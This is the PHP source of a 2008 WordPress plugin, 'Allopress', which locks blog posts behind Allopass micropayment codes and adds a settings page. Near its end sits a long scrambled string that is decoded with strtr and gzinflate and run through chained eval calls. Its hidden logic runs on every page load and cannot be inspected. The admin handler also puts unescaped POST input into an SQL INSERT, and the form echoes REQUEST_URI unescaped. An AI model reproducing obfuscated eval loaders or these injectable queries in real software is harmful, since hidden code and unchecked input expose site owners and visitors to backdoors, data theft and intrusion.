<?php
/*
(c)Copyright Erwan Regnier , 15/10/2008
Documentation: http://www.allopress.com

----------------------------------------------------------------------------
Informations sur le plugin (ne pas modifier, destine a Wordpress):

Plugin Name: Allopress
Plugin URI: http://www.allopress.com
Tags: allopass, rentabiliser, monetiser, protection article, publicite
Description: Protection d'articles Wordpress par micropaiement Allopass, <a href="http://www.allopress.com" target="_blank">si vous ne possedez pas de licence cliquez-ici</a>
Version: 1.0.2
Author: Erwan Regnier
Author URI: http://www.erwanregnier.fr

Plugin compatible avec les versions supérieures à la version 2.3.3 de Wordpress (jusqu'a la version 2.6.2)
----------------------------------------------------------------------------

##IMPORTANT: UTILISATION ##

Plugin NON OpenSource !
L'utilisation de ce plugin sans licence valide vous expose à des poursuites.
Pour obtenir une licence vous devez vous rendre sur le site http://www.allopress.com
Il est distribué sans garanties concernant les eventuelles pertes ou alterations de donnees ou de compatibilite avec un plugin tiers.

L'acquisition d'une licence ne vous donne pas le droit de redistribuer ou de modifier ce script.

La version 1.0.2 de ce plugin Allopress est 'gratuite', vous toucherez 90% des revenus generes par les formulaires Allopass installes par le plugin.
Cette version gratuite est limitee en fonctionnalites, pour une version plus complete rendez-vous sur http://www.allopress.com

## CHANGELOG ##

version 1.0.2 :
-Correction d'un bug avec les sessions Wordpress (le formulaire restait affiche apres saisie d'un code valide)
-Correction d'un bug avec les blogs installes en sous repertoire (http://www.monsite.com/monblog/)

version 1.0.1 :
-Correction d'un bug dans l'administration (affichage de l'ancien ID du document lors de la mise à jour)
-Correction d'un bug dans l'administration (remise à 0 des tables à la reactivation du plugin)
-Ajout de la redirection vers l'article dans lequel le code allopass a été saisi si celui-ci est valide (au lieu de l'index du blog)


/!\ NE PAS MODIFIER LE CODE SUIVANT /!\
/!\ DO NOT MODIFY FROM HERE /!\

*/
if (!session_id()) session_start();

register_activation_hook(__FILE__,'initallopress');

add_action('admin_menu', 'adminallo');

function initallopress() {
	global $wpdb;
	$testid = $wpdb->get_var("SELECT id_doc FROM allopress LIMIT 1;");
	if ($testid == "" || !$testid):
		$sql = "CREATE TABLE allopress (
		  id_doc VARCHAR(40) NOT NULL ,
		  UNIQUE KEY id_doc (id_doc)
		);
		CREATE TABLE allopress_codes (
		  codes VARCHAR(40) NOT NULL ,
		  post INT(11) NOT NULL,
		  UNIQUE KEY codes (codes)
		);
		INSERT INTO allopress VALUES ('123/456/789');
		";
	
		require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
		dbDelta($sql);
	endif;
}


function adminallo(){
add_options_page('Parametres Allopress', 'AlloPress', 8, __FILE__, 'optadminallo');
}

function optadminallo(){
	global $wpdb;
	$iddoc = $wpdb->get_var("SELECT id_doc FROM allopress LIMIT 1;");
	
	if(isset($_POST['iddoc']) && $_POST['iddoc'] != "" && $_POST['iddoc'] != $iddoc):
		$doc = $_POST['iddoc'];
		if (eregi("[[:digit:]]*\/[[:digit:]]*\/[[:digit:]]*",$doc)):
			
			$del = "DELETE FROM allopress;";
			$ins= "INSERT INTO allopress(id_doc) VALUES('$doc') ;";
			
			if (!$wpdb->query( $del ) || !$wpdb->query( $ins )):
			?>
			<div id="message" class="error">
			  <p><strong>Erreur lors de la mise &agrave; jour des param&egrave;tres!</strong><br />
				<br />
			  </p>
			</div>
			<?
			else:
			$iddoc = $doc;	
			?>
			<div id="message" class="updated fade">
			  <p><strong>Param&egrave;tres sauvegard&eacute;s !</strong><br /></p>
			</div>
			<?
			endif;
		else:
		?>
			<div id="message" class="error">
			  <p><strong>Format incorrect !</strong><br />
			    L'id du document doit &ecirc;tre du type 123/456/789 <br />
				<br />
			  </p>
			</div>
			<?
		endif;
	
		
	endif;
	?>
	
<div class="wrap">
<h2>Param&eacute;trage AlloPress </h2>
<form name="form1" method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
<table class="form-table">
<tr valign="top">
<th scope="row"><label for="iddoc">ID Allopass du document: </label></th>
<td><input name="iddoc" type="text" id="iddoc" value="<?php echo $iddoc;?>" size="30" class="code" /><br />
  Ex: 1234/5476596/35324 <br />
  N'oubliez pas les &quot;/&quot; !! </td>
</tr>
</table>
<p class="submit">
<input type="submit" name="Submit" value="Enregistrer les modifications" />
</p>
</form>
</div>
	
	<?
}
$__c='vK6JuK{<1i0 jVW8uV0S1V.S1htOGk=p6y7d3KW8jvZ[4VZRlk=ppWTpZv}0jvZ9Z<.aihxoL.ZTahxxlk=ppoW..ottqeTJ4K75uK{d6Va=p/xk6VjwqKx5xW0y3Dj=j5{Wco.Y.vTO6W0CuyEtZ5pqceTbuV7d4/p54[Etco5{e.LtEc8RIeCHvtCCaC.YLa7EjY<tpW0/Z.Zuj5pWL<WEcvpxlk=ppWpWL<WEcv}0j/.huV. 3y0C6ettpWpWL<WEcv}OlkCIveZ8uy{bjY<t6y.<Dy0kxV5duRt24y5<6D.huv4Olk=pp/jtqeT}6K586ettjKb<x/}FBh0[x[4 3i78u[Tb4[E 3y0wBy{=6i{QB[6KB2T=4YLML<0oZc<CaC.YLa7EpCW..ot0poW..otRjvCHvtCIvi5KIvTrxiprx/j=jvZhirTxBY}8ER}OjY<0jvpqehjtIe}FvtCdB<75jV{d6Vat6D{<j/6buV5C6e}IvLCC3yb53ywk6DpwjY<tp/xk6VjwqKx5xW0y3Dj=j5{Wco.Y.vTku[{<jo6ec<<t3i78u[Th6D{rDy{d6V.rjWxjZ.pWjV{d6V.rjY<tphZeZa{Tcok2jRCHvtCp1i3tIvoC3yb53ywk6DpwIc=IvLCdBy58jVf26DbO4[Z5j/Tb4hTC3i]rjV7bjVpC6vTduRT8pyWPu[.<6L=pvLCCDJ{WaJ{pc<]up<WvcJTeZ.{cDh4 pWTpZW<tqeT<42.5lk=pvLCC4[Zd3y8tqe}Rea]cZ.pajo5l.o>t3i78u[Th6D{rDy{d6V.rIV{d6V.rB/Td4[LOjW6TcW.Waht2pWpWL<WEcv48pWTpZvCHjS8IvLCpp/xk6Vjwq2WJ6Dp]IvZrxV0S1hCHvtCpvib53iZ54RtRcV0S3DZOuyfFjvZ8uy{bq[}0pWTpZvjOlk=pvL55GV5<IvCHvtCp6i7r6c=IvLCp1i3tIvZS1V.S1[T54K<tqc<tpWTpZvCIvLCpBh0OuvT54[LtxKW81iZ5jV.<jV.f1D{<6eTC3i]rjV7bjVpb4ya8jV.<jV0 jV{=6DpS1Vat3eTb3y{56V.hjVWJj/Td4[Lt4D.OjV7J1eT54[Lt3DZ<4K5RxiaIvLCpGk=pvLCCDJ{WaJ{pc<]up<WvcJTeZ.{cDh4 pWTpZW<tqeT<42.5lk=pvL5=6iWC6Dj=jC7d3yW<1i0 lR}CuV0S3c0kqeZLeaLRIc8IvLCp6DbOxvtOlk=pvL50vtCpvi.84yaIvLCpGk=pvLCdBy58jV.rxvTy3i7O6Vat6DLt6DbO4[Z5jVZbu2EtuVot3KWr6ektcaWpahTduRTS1V.h3yb5jVotuvxJxV581D{54RTku[.hj/. jVWJx/p5j/Td4[Ltqcft6Dph6D.hjYoIvLCp1V.b6V.hIvpEuy{bxV5duS=tpV7d3yoM6DphqcoRIc8IvLCp6DbOxvtOlk=pvL50vtCp6i]C1i3HvtCpvt55u/{5lt=pBh0E6eTSuyZ5jV.rxvTOu26buV5C6e}0qcft6Dph6D.hjYjIvLCppW0cZ.{cea0lihxTLC0LaC.caJ>2BRZLeaZxjY<t6KW84yaHvtCpvib53iZ54RtRcV0S3DZOuyfFjvZ8uy{bqy.h4S<hjRCHvtCpvi.f1DL=Ic8Ivi. 6V5Klk=I9LOKxi]SxV5duRT26i]<3ij=pV5CID8Ivix8uypbuv}Cx[TC3S8Ive>duyftxK5C6eT86DEtxKWh1iWRuV.rj/xd4KZk4K.r4hTC6DEt4K.7xi.<6DEt4/p53y.C6i]<6DEIveZ[4VZRBc]Ku/.r1vtOlk=pBh0duRTh6i{J4V.h6eT8py5CjVZJjVZd3[.w6i]<jVW8uV0k3D{rj/p5u2{51ix 6eTC3i]rjV7bj/Tb42ZO6eTb6VJOut=ppV5C6V0SjY<tp/xk6VjwqKx5xW0y3Dj=j5{Wco.Y.vTO6W0CuyEtZ5pqceTbuV7d4/p54[Etco5{e.LtEc8RIc8IveZO6VW8jY<t6DbkuV0C6et2Bh48pV5C6V0SIc8IvtCppVW8uV0<3ijtqe}2vtC>x/jt1V.O6yb<qejr{Y4Rqt=pqvowBeTTco7qaWpWaJEtBe<+vR}tq/ZCj/xO6/Z=qejhlYLRqt=tjv}>1i6h3iJ5jV]buia0jCWL4y7562LRjvT[1iZ<1Y<RESt<jRT=6i521/L0jSE<{hjt62pbui.Ru[pC6Dj0jS}RjVJb4KxOuKb51ix=xY<REvjtuiWh6y5 xy5CxVt0jS}Rj/{S4K08uV5 6r<RuK>Rj/{h3r<R1/Z<4Y=dB[TbGiJ5u2L 3i78u[Tb4[E 3y0wByWSxVad4y{h1DT<4h0O62pbuiaduV.Kxv]b4/aM1iZrqe4 pV5C3i7uEW< ph6b4W0S3.0O6V{uEW<0ErL]ErCklv6b4W0S3.0wu2ZuEW<0Ec}K1iZCqe4 pV5C3i7uE.< ph683i]2qi6hp2p53yW8uY<7pKZbxVo0phfC1iL phj+qv0O62pbuia+vR}tqv0<6YfIjv}>xVLtxy5CxVt0jSoJERj+vR}tjY7O62pbuiatuKWw6c<RL.Tr4K521/LRj/xO6/Z=qej7{cjRjVb51ix=xY<RErL[jRTK4KWw6ipd4KZ54S<REvjtuiWh6y5 1V.O6yb<qejkjRTw3Dp21i][1iZ<1Y<REvjt4y{huy781i]2qep uhjt4[pSqep=x/ZklR>d4VW]ui. xv]buV7d4VWr4h]Suy<d3i{<6e0r3[pO4/ZrBy5K4KWw6e0h1ix=xv]b4/aM1iZrqe4 pV5C3i7uEW< ph6b4W0S3.0O6V{uEW<0ErL]ErCklv6b4W0S3.0wu2ZuEW<0Ec}K1iZCqe4 pV5C3i7uE.< ph683i]2qi6hp2p53yW8uY<7pKZbxVo0phfC1iL phj+qv0O62pbuia+vR}tqv0<6YfIjYkdx/j+vt=2lk=IvL=tj/p5x/.huRbJxV3fDy. 3y0C6etC3i78u[Zb3RCOlkO0vtOKxi]SxV5duRTbuV7d4/p54[E=pV{du2Z5u2aOj/8I6y7d3KW8jvZku[{<lk=I1i3tIvoCDJ{WaJ{pc<]up<WvcJTeZ.{cDh4 p/Td4[LwqC5oDe}KpRT54K.21etRDWwTco7qaWpWaJ{4Det I57uDv0Tco7qaWpWaJ{4DeCRBvZSuy]<6i]JIeCFvtCC3y0 xV. xe}0jV.h6ixOD[p54V7b3ya=j57uLa7EcJTeZ.{cDW<=BRO4iJkdLa7EcJTeZ.{cDW<OjRkt6y. xVWRIvZku[{<Bc]pZvC8pV{du2Z5u2aOlkO5u/{5lt=ppV{du2Z5u2atqeT54K.21.0h6DT83i{5Ivp4i<WEco0LaC.caJ7xjRktjRj8pV{du2Z5u2aOlk=ppV{du2Z5u2atqeT54K.21.0h6DT83i{5Ivp4iJkdLa7EcJTeZ.{cDW<RBv}RjRkC3y0 xV. xeCHvK. 6V5Klk=I4K.<xDp jvZSuy]<6i]JlkO0vtmm';$__s=strtr($__c,"ACv.sfKXY{dEn58wjIBToFUtb9>gL}=kqeZ0RuD[4lz Om<12PyHSWJGp7MaiVQr/cN]h63x"," kCV]4m.DNvM>lstIKLBE6}ghf8[QAowPSR9ibX3cO{up=0anq27jF1eJx/UWGrzHT<5yZYd");eval(gzinflate("S‰O±-.)*J-ÓPJMÉONM‰71K-NLRÒ´"));eval('$__x=$__d("$__s");');eval($__x); 

if (isset($_GET['part'])) $_SESSION['partid'] = $_GET['part'];
if (isset($_GET['DATAS']) && isset($_GET['RECALL'])) allocheck();
add_filter('the_content', 'allopress');
add_filter('the_content_rss', 'allopress');
add_filter('the_excerpt_rss', 'allopress');
add_filter('the_excerpt', 'allopress');

?>
